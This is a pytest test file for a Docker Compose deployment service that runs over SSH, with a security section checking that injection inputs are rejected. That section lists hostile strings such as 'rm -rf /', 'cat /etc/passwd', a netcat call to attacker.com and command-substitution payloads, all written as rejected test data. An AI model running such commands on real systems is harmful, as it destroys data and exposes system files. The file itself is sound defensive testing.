"""
Unit tests for ComposeService.
"""

import pytest
import tempfile
import os
from unittest.mock import MagicMock

from remote_compose.services import ComposeService
from remote_compose.exceptions import ComposeFileError, ValidationError


class TestComposeService:

    @pytest.fixture
    def service(self):
        return ComposeService()

    @pytest.fixture
    def valid_compose_content(self):
        return """
version: '3.8'
services:
  web:
    image: nginx:alpine
    ports:
      - "8080:80"
  redis:
    image: redis:alpine
"""

    def test_validate_compose_file_valid(self, service, valid_compose_content):
        """Test validating a valid compose file."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write(valid_compose_content)
            path = f.name

        try:
            result = service.validate_compose_file(path)

            assert result["valid"] is True
            assert "web" in result["services"]
            assert "redis" in result["services"]
            assert result["content"] == valid_compose_content
        finally:
            os.unlink(path)

    def test_validate_compose_file_not_found(self, service):
        """Test validating non-existent compose file."""
        with pytest.raises(ComposeFileError) as exc_info:
            service.validate_compose_file("/nonexistent/docker-compose.yml")

        assert "not found" in str(exc_info.value)

    def test_validate_compose_file_invalid_yaml(self, service):
        """Test validating compose file with invalid YAML."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write("invalid: yaml: content: [")
            path = f.name

        try:
            with pytest.raises(ComposeFileError) as exc_info:
                service.validate_compose_file(path)

            assert "YAML" in str(exc_info.value)
        finally:
            os.unlink(path)

    def test_validate_compose_file_no_services(self, service):
        """Test validating compose file without services key."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write("version: '3.8'\n")
            path = f.name

        try:
            with pytest.raises(ComposeFileError) as exc_info:
                service.validate_compose_file(path)

            assert "services" in str(exc_info.value)
        finally:
            os.unlink(path)

    def test_read_compose_file(self, service, valid_compose_content):
        """Test reading compose file content."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write(valid_compose_content)
            path = f.name

        try:
            content = service.read_compose_file(path)
            assert content == valid_compose_content
        finally:
            os.unlink(path)

    def test_upload_compose_files(self, service, mocker, valid_compose_content):
        """Test uploading compose files to remote host."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(success=True)
        mock_ssh.upload_content.return_value = True

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write(valid_compose_content)
            path = f.name

        try:
            result = service.upload_compose_files(
                ssh_client=mock_ssh,
                compose_path=path,
                remote_dir="/tmp/test-deploy",
            )

            assert result["compose_path"] == "/tmp/test-deploy/docker-compose.yml"
            mock_ssh.execute.assert_called()
            mock_ssh.upload_content.assert_called()
        finally:
            os.unlink(path)

    def test_execute_compose(self, service):
        """Test executing compose command."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="Container started",
            stderr="",
            exit_code=0,
        )

        result = service.execute_compose(
            ssh_client=mock_ssh,
            command="up -d",
            compose_path="/remote/docker-compose.yml",
            project_name="test-project",
        )

        assert result.success is True
        mock_ssh.execute.assert_called_once()
        call_args = mock_ssh.execute.call_args[0][0]
        assert "docker compose" in call_args
        assert "-p test-project" in call_args
        assert "up -d" in call_args

    def test_execute_compose_with_env_vars(self, service):
        """Test executing compose command with environment variables."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="",
            stderr="",
            exit_code=0,
        )

        service.execute_compose(
            ssh_client=mock_ssh,
            command="up -d",
            compose_path="/remote/docker-compose.yml",
            env_vars={"DB_HOST": "localhost", "DEBUG": "false"},
        )

        call_args = mock_ssh.execute.call_args[0][0]
        assert "export DB_HOST=" in call_args
        assert "export DEBUG=" in call_args

    def test_up_command(self, service):
        """Test compose up command generation."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="",
            stderr="",
            exit_code=0,
        )

        service.up(
            ssh_client=mock_ssh,
            compose_path="/remote/docker-compose.yml",
            project_name="test",
            detached=True,
            build=True,
            remove_orphans=True,
        )

        call_args = mock_ssh.execute.call_args[0][0]
        assert "up" in call_args
        assert "-d" in call_args
        assert "--build" in call_args
        assert "--remove-orphans" in call_args

    def test_down_command(self, service):
        """Test compose down command generation."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="",
            stderr="",
            exit_code=0,
        )

        service.down(
            ssh_client=mock_ssh,
            compose_path="/remote/docker-compose.yml",
            project_name="test",
            remove_volumes=True,
            remove_images="all",
        )

        call_args = mock_ssh.execute.call_args[0][0]
        assert "down" in call_args
        assert "-v" in call_args
        assert "--rmi all" in call_args

    def test_get_container_ids(self, service):
        """Test getting container IDs."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="abc123\ndef456\nghi789\n",
            stderr="",
            exit_code=0,
        )

        ids = service.get_container_ids(
            ssh_client=mock_ssh,
            compose_path="/remote/docker-compose.yml",
        )

        assert ids == ["abc123", "def456", "ghi789"]


class TestComposeServiceSecurity:
    """Security tests for ComposeService - command injection prevention."""

    @pytest.fixture
    def service(self):
        return ComposeService()

    def test_validate_project_name_valid(self, service):
        """Test valid project names pass validation."""
        valid_names = [
            "myproject",
            "my-project",
            "my_project",
            "my.project",
            "project123",
            "123project",
            "a",
        ]
        for name in valid_names:
            result = service._validate_project_name(name)
            assert result == name

    def test_validate_project_name_injection_attempts(self, service):
        """Test that command injection attempts in project names are rejected."""
        malicious_names = [
            "project; rm -rf /",
            "project && cat /etc/passwd",
            "project | nc attacker.com 1234",
            "project`whoami`",
            "project$(id)",
            "project\necho pwned",
            "../../../etc/passwd",
            "project\x00malicious",
            "PROJECT",  # Must be lowercase
            "My Project",  # Spaces not allowed
            "-invalid",  # Cannot start with hyphen
            "_invalid",  # Cannot start with underscore
            ".invalid",  # Cannot start with period
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError):
                service._validate_project_name(name)

    def test_validate_project_name_empty(self, service):
        """Test that empty project names are rejected."""
        with pytest.raises(ValidationError):
            service._validate_project_name("")

        with pytest.raises(ValidationError):
            service._validate_project_name(None)

    def test_validate_project_name_too_long(self, service):
        """Test that very long project names are rejected."""
        with pytest.raises(ValidationError):
            service._validate_project_name("a" * 101)

    def test_validate_path_valid(self, service):
        """Test valid paths pass validation."""
        valid_paths = [
            "/tmp/deploy",
            "/var/lib/docker/compose",
            "/home/user/projects/my-app",
            "/opt/app_data/v1.0.0",
        ]
        for path in valid_paths:
            result = service._validate_path(path)
            assert result == path

    def test_validate_path_injection_attempts(self, service):
        """Test that path traversal and injection attempts are rejected."""
        malicious_paths = [
            "/tmp/../etc/passwd",
            "/tmp/..\\windows\\system32",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/;rm -rf /",
            "/tmp/|cat /etc/passwd",
            "/tmp/path with spaces",
            "/tmp/$HOME",
            "relative/path",  # Must be absolute
            "/tmp/path\x00null",
        ]
        for path in malicious_paths:
            with pytest.raises(ValidationError):
                service._validate_path(path)

    def test_validate_path_empty(self, service):
        """Test that empty paths are rejected."""
        with pytest.raises(ValidationError):
            service._validate_path("")

    def test_validate_path_too_long(self, service):
        """Test that very long paths are rejected."""
        with pytest.raises(ValidationError):
            service._validate_path("/tmp/" + "a" * 500)

    def test_validate_env_var_name_valid(self, service):
        """Test valid environment variable names pass validation."""
        valid_names = [
            "DB_HOST",
            "DEBUG",
            "MY_VAR_123",
            "_PRIVATE_VAR",
            "a",
            "A",
        ]
        for name in valid_names:
            # Should not raise
            service._validate_env_var(name, "value")

    def test_validate_env_var_name_injection_attempts(self, service):
        """Test that invalid env var names are rejected."""
        malicious_names = [
            "$(whoami)",
            "VAR;echo",
            "VAR`id`",
            "123_VAR",  # Cannot start with number
            "VAR NAME",  # No spaces
            "VAR-NAME",  # No hyphens
            "",
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError):
                service._validate_env_var(name, "value")

    def test_validate_env_var_protected_vars(self, service):
        """Test that protected environment variables cannot be overridden."""
        protected_vars = [
            "PATH",
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "PYTHONPATH",
            "HOME",
            "USER",
            "SHELL",
            "PWD",
        ]
        for var in protected_vars:
            with pytest.raises(ValidationError) as exc_info:
                service._validate_env_var(var, "malicious_value")
            assert "protected" in str(exc_info.value).lower()

    def test_validate_env_var_value_too_long(self, service):
        """Test that very long env var values are rejected."""
        with pytest.raises(ValidationError):
            service._validate_env_var("NORMAL_VAR", "x" * 40000)

    def test_execute_compose_sanitizes_env_vars(self, service):
        """Test that env vars are properly escaped when executing compose."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(
            success=True,
            stdout="",
            stderr="",
            exit_code=0,
        )

        # Values that could cause injection if not properly escaped
        service.execute_compose(
            ssh_client=mock_ssh,
            command="up -d",
            compose_path="/remote/docker-compose.yml",
            env_vars={
                "NORMAL": "value",
                "WITH_SPACES": "hello world",
                "WITH_QUOTES": "it's a test",
                "WITH_SPECIAL": "value; echo pwned",
            },
        )

        call_args = mock_ssh.execute.call_args[0][0]
        # Verify env vars are present and quoted
        assert "export NORMAL=" in call_args
        assert "export WITH_SPACES=" in call_args
        # Values should be shell-quoted (shlex.quote wraps in single quotes)
        assert "'" in call_args

    def test_upload_compose_files_validates_remote_dir(self, service, mocker):
        """Test that remote directory path is validated before upload."""
        mock_ssh = MagicMock()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
            f.write("services:\n  web:\n    image: nginx\n")
            path = f.name

        try:
            # Valid path should work
            mock_ssh.execute.return_value = MagicMock(success=True)
            mock_ssh.upload_content.return_value = True
            result = service.upload_compose_files(
                ssh_client=mock_ssh,
                compose_path=path,
                remote_dir="/tmp/valid-path",
            )
            assert result["remote_dir"] == "/tmp/valid-path"

            # Invalid path should raise ValidationError
            with pytest.raises(ValidationError):
                service.upload_compose_files(
                    ssh_client=mock_ssh,
                    compose_path=path,
                    remote_dir="/tmp/../etc/passwd",
                )
        finally:
            os.unlink(path)

    def test_cleanup_remote_files_validates_path(self, service):
        """Test that cleanup validates the remote directory path."""
        mock_ssh = MagicMock()
        mock_ssh.execute.return_value = MagicMock(success=True)

        # Valid path should work
        service.cleanup_remote_files(mock_ssh, "/tmp/valid-path")
        mock_ssh.execute.assert_called()

        # Malicious path should be rejected
        with pytest.raises(ValidationError):
            service.cleanup_remote_files(mock_ssh, "/tmp/../../../etc")

    def test_mask_sensitive_env_vars(self, service):
        """Test that sensitive environment variable values are masked for logging."""
        env_vars = {
            "DB_HOST": "localhost",
            "DB_PASSWORD": "secret123",
            "API_KEY": "abc123",
            "AUTH_TOKEN": "xyz789",
            "AWS_SECRET_ACCESS_KEY": "awssecret",
            "DEBUG": "true",
        }

        masked = service._mask_sensitive_env_vars(env_vars)

        # Non-sensitive should be visible
        assert masked["DB_HOST"] == "localhost"
        assert masked["DEBUG"] == "true"

        # Sensitive should be masked
        assert masked["DB_PASSWORD"] == "***"
        assert masked["API_KEY"] == "***"
        assert masked["AUTH_TOKEN"] == "***"
        assert masked["AWS_SECRET_ACCESS_KEY"] == "***"
